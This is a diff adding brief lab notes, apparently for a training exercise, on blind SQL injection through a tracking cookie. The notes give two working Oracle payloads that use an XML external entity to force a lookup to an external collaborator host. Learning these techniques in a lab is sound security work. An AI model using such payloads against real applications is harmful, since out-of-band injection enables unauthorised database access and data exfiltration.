@@ -1,0 +1,9 @@
+Blind SQL injection with out-of-band interaction, vulnerable parameter tracking cookie.
+The SQL query is executed asynchronously and has no effect on the application's response.
+You can however trigger out-of-band interactions with an external domain.
+
+Goal: Cause a DNS look up to Burp collaborator
+
+Analysis: Either of these works
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://pxq9vesus8lxtq3hwk2aq2nlvc13pugi5.oastify.com/"> %remote;]>'),'/l') FROM dual--
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://pxq9vesus8lxtq3hwk2aq2nlvc13pugi5.oastify.com/"> %remote;]>'),'/l') FROM dual)--
